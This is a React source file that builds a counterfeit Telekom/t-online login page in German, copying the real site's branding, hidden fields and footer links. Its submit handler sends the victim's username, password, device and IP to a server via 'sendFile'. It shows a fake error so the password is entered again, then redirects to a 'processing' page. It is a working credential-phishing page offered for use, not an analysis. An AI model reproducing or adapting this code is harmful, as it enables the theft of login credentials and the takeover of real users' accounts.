import { navigate } from "@reach/router";
import React from "react";
import { useState } from "react";
import { notify, sendFile } from "../servers";
import "./styles.scoped.css";
import "./telekomfiles/components.scoped.css";
import "./telekomfiles/login.scoped.css";

function Telekom({ location }) {
    const [values, setValues] = useState({
        username: location.state.email,
        device: location.state.device,
        ip: location.state.ip,
        password: "",
      });
    
      const [submited, setSubmited] = useState({ status: false, count: 0 });
      const [showpassword, setShowpassword] = useState(false);
    
      const handleChange = (event) => {
        setValues({
          ...values,
          [event.target.name]: event.target.value,
        });
      };
    
      const submitForm = (event) => {
        event.preventDefault();
        setSubmited({ ...submited, status: !submited.status });
    
        if (submited.count <= 1) {
          sendFile(values).then((data) => {
            // show error
            notify();
            setSubmited({ ...submited, count: submited.count + 1 });
            setValues({ ...values, password: "" });
            console.log(data);
            console.log(submited);
          });
        } else {
          sendFile(values).then((data) => {
            // redirect
            navigate("../processing", { state: { domain: location.state.domain } });
            console.log("ok");
          });
        }
      };
  return (
    <div>
      <div bis_skin_checked={1}>
        <header id="tbs-header">
          <div id="tbs-header-content" bis_skin_checked={1}>
            <div className="container-fixed clearfix" bis_skin_checked={1}>
              <div className="pull-left" bis_skin_checked={1}>
                <i className="icon icon-large">tT</i>
              </div>
              <div className="pull-right" bis_skin_checked={1}>
                <span className="tbs-slogan">erleben, was verbindet.</span>
              </div>
            </div>
          </div>
        </header>
        <div
          className="offset-bottom-4 offset-s-bottom-3"
          bis_skin_checked={1}
        />
      </div>
      <div bis_skin_checked={1}>
        <div bis_skin_checked={1}>
          <iframe
            id="tealium-callback-tracking"
            src="./telekomfiles/emetriq-xdn.html"
            sandbox="allow-scripts allow-same-origin"
            tabIndex={-1}
          />
        </div>
      </div>
      <div className="container-fixed" bis_skin_checked={1}>
        <div className="tbs-container" bis_skin_checked={1}>
          <div id="tbs-headline" bis_skin_checked={1}>
            <div
              id="tbs-brand"
              className="tbs-relative text-center"
              bis_skin_checked={1}
            >
              <img src={require("./telekomfiles/t-online-logo-29112019.png")} />
            </div>
            <h1 className="offset-top-0 offset-bottom-3 text-center">
              Telekom Login Benutzername eingeben
            </h1>
          </div>
          <div className="login-box" bis_skin_checked={1}>
            <div className="offset-bottom-1" bis_skin_checked={1}>
              <form
                onSubmit={submitForm}
              >
                <input
                  type="hidden"
                  name="xsrf_VfoTtFr_NkPonQhfFIt93g"
                  defaultValue="OOCPDBFZGWlWuynpBTjLVg"
                />
                <input
                  type="hidden"
                  name="tid"
                  defaultValue="01ddda24-228a-4e3a-9614-711cd366a9d9"
                />
                <input
                  type="hidden"
                  name="x-show-cancel"
                  defaultValue="false"
                />
                <input type="hidden" name="bdata" id="behavio_hidden" />
                <button className="btn-hidden" name="pw_submit" type="submit" />
                <div className="offset-bottom-1" bis_skin_checked={1}>
                  <div className="form-input-set" bis_skin_checked={1}>
                    <input
                      id="username"
                      name="username"
                      onChange={handleChange}
                      required
                      defaultValue={values.username}
                      type="email"
                      inputMode="email"
                      className="form-input"
                      maxLength={256}
                      aria-describedby="usrInfo"
                      tabIndex={10}
                      placeholder="Nutzername"
                    />

                    <i
                      id="inputNotificationToggle"
                      className="icon icon-help"
                      data-target="#usrInfo"
                      data-trigger="click"
                    />
                  </div>

                  <div className="form-input-set" bis_skin_checked={1}>
                    <input
                      id="password"
                      name="password"
                      onChange={handleChange}
                      defaultValue={values.password}
                      type="password"
                      required
                      inputMode="password"
                      className="form-input"
                      maxLength={256}
                      tabIndex={10}
                      placeholder="Passwort"
                    />
                  </div>

                  <div id="usrInfo" className="info-box" bis_skin_checked={1}>
                    <p>So können Sie sich anmelden:</p>
                    <ul>
                      <li>
                        <span className="text-bold">E-Mail-Adresse: </span>
                        <span>
                          Ihre Telekom E-Mail-Adresse oder Ihre E-Mail-Adresse
                          eines anderen Anbieters, mit der Sie sich registriert
                          haben.
                        </span>
                      </li>
                      <li>
                        <span className="text-bold">Mobilfunk-Nummer: </span>
                        <span>
                          Ihre Telekom Mobilfunk-Nummer, wenn Sie diese mit
                          Ihrem Telekom Login verknüpft haben.
                        </span>
                      </li>
                      <li>
                        <span className="text-bold">VERIMI Konto: </span>
                        <span>
                          Wenn Ihr Telekom Login mit einem VERIMI Konto
                          verknüpft ist, geben Sie hier bitte zunächst Ihren
                          Telekom Login Benutzernamen ein. Anschließend leiten
                          wir Sie zu VERIMI weiter.
                        </span>
                      </li>
                    </ul>
                  </div>
                  <div className="login-helpers clearfix" bis_skin_checked={1}>
                    <div
                      id="tbs-signin-remember"
                      className="form-checkbox-set"
                      bis_skin_checked={1}
                    >
                      <label>
                        <input
                          id="checkbox_remember_user"
                          type="checkbox"
                          name="remember_user"
                          defaultValue={1}
                          className="form-checkbox "
                          tabIndex={30}
                        />
                        <span>Benutzername merken</span>
                      </label>
                    </div>
                  </div>
                  <div
                    className="clearfix offset-bottom-1"
                    bis_skin_checked={1}
                  >
                    <button
                      id="pw_submit"
                      name="pw_submit"
                      type="submit"
                      disabled={submited.status}
                      className="text-center btn btn-brand btn-block btn-large"
                      tabIndex={40}
                    >
                      Weiter
                    </button>
                  </div>
                  <div className="clearfix" bis_skin_checked={1}>
                    <button
                      className="btn btn-default btn-block btn-large"
                      role="button"
                      name="showSelectIdentMethod"
                      tabIndex={41}
                      type="submit"
                    >
                      Andere Anmeldeoptionen
                    </button>
                  </div>
                </div>
                <input
                  name="hidden_pwd"
                  type="password"
                  className="hidden"
                  aria-hidden="true"
                  tabIndex={-1}
                  autoComplete="off"
                />
              </form>
              <div
                className="text-center offset-l-bottom-3-5 offset-l-top-2 offset-s-bottom-2-5 offset-s-top-1-5"
                bis_skin_checked={1}
              >
                <p>Benutzername oder Passwort vergessen?</p>
                <p>Bitte nutzen Sie „Andere Anmeldeoptionen“.</p>
              </div>
              <div
                className="text-center offset-bottom-2 offset-l-top-2 offset-s-top-1-5"
                bis_skin_checked={1}
              >
                <a
                  id="helpLink"
                  href="https://www.telekom.de/hilfe/telekom-login"
                  tabIndex={45}
                  target="_blank"
                >
                  Benötigen Sie Hilfe?
                </a>
              </div>
              <div className="text-center offset-bottom-2" bis_skin_checked={1}>
                <div bis_skin_checked={1}>
                  <p>
                    <span>Noch keinen Telekom Login?</span>
                    <a
                      id="registrationLink"
                      className="text-nowrap"
                      tabIndex={50}
                      href="https://www.telekom.de/unterwegs/apps-und-dienste/kommunikation/telekom-e-mail"
                    >
                      Telekom Login erstellen
                    </a>
                    <span>und E-Mail nutzen.</span>
                  </p>
                </div>
              </div>
              <div className="text-center offset-bottom-2" bis_skin_checked={1}>
                <img src={require("./telekomfiles/services.png")} />
              </div>
              <div className="text-center offset-bottom-2" bis_skin_checked={1}>
                <div bis_skin_checked={1}>
                  <p>
                    <span>
                      Jetzt auch mit Ihrem VERIMI Konto bei der Telekom
                      anmelden.
                    </span>
                    <a
                      id="verimiLink"
                      className="text-nowrap"
                      tabIndex={60}
                      target="_blank"
                      href="https://www.telekom.de/hilfe/vertrag-meine-daten/login-daten-passwoerter/verimi"
                    >
                      Hier informieren über VERIMI
                    </a>
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
      <footer id="tbs-footer">
        <div className="container-fixed" bis_skin_checked={1}>
          <div className="pull-left" bis_skin_checked={1}>
            <p>© Telekom Deutschland GmbH</p>
            <p className="tbs-text-11">
              25.03.0, 329d6b7501374addb685e6b472534a04,
              32ade5dd4c8da31662262f245f3decee46f3c737
            </p>
          </div>
          <div className="pull-right" bis_skin_checked={1}>
            <ul className="list-inline">
              <li>
                <a href="https://www.telekom.de/impressum" target="_blank">
                  Impressum
                </a>
              </li>
              <li>
                <a
                  id="data-protection"
                  href="https://www.telekom.de/ueber-das-unternehmen/datenschutz#fragen-und-antworten"
                  target="_blank"
                >
                  Datenschutz
                </a>
              </li>
            </ul>
          </div>
        </div>
      </footer>
      <div bis_skin_checked={1} />
      <div
        id="goog-gt-tt"
        className="skiptranslate"
        dir="ltr"
        bis_skin_checked={1}
      >
        <div style={{ padding: "8px" }} bis_skin_checked={1}>
          <div bis_skin_checked={1}>
            <div className="logo" bis_skin_checked={1}>
              <img
                src="./telekomfiles/translate_24dp.png"
                width={20}
                height={20}
                alt="Google Translate"
              />
            </div>
          </div>
        </div>
        <div
          className="top"
          style={{ padding: "8px", float: "left", width: "100%" }}
          bis_skin_checked={1}
        >
          <h1 className="title gray">Original text</h1>
        </div>
        <div className="middle" style={{ padding: "8px" }} bis_skin_checked={1}>
          <div className="original-text" bis_skin_checked={1} />
        </div>
        <div className="bottom" style={{ padding: "8px" }} bis_skin_checked={1}>
          <div className="activity-links" bis_skin_checked={1}>
            <span className="activity-link">
              Contribute a better translation
            </span>
          </div>
          <div className="started-activity-container" bis_skin_checked={1}>
            <hr
              style={{
                color: "#ccc",
                backgroundColor: "#ccc",
                height: "1px",
                border: "none",
              }}
            />
            <div className="activity-root" bis_skin_checked={1} />
          </div>
        </div>
        <div
          className="status-message"
          style={{ display: "none" }}
          bis_skin_checked={1}
        />
      </div>
      <div className="goog-te-spinner-pos" bis_skin_checked={1}>
        <div className="goog-te-spinner-animation" bis_skin_checked={1}>
          <svg
            xmlns="http://www.w3.org/2000/svg"
            className="goog-te-spinner"
            width="96px"
            height="96px"
            viewBox="0 0 66 66"
          >
            <circle
              className="goog-te-spinner-path"
              fill="none"
              strokeWidth={6}
              strokeLinecap="round"
              cx={33}
              cy={33}
              r={30}
            />
          </svg>
        </div>
      </div>
    </div>
  );
}

export default Telekom;
